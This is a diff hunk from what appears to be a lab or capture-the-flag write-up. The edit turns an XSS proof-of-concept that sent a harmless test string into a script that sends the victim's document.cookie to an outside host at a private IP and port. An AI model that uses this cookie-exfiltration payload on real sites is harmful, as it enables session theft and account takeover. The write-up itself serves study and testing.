@@ -59,7 +59,7 @@ Initially it looked like the payload was not working, so I tested a different ex
 
 ```html
 <script>
-new Image().src="http://10.64.123.142:8000/?p="+encodeURIComponent("weee")
+new Image().src="http://10.64.123.142:8000/?p="+encodeURIComponent(document.cookie)
 </script>
 ```
 
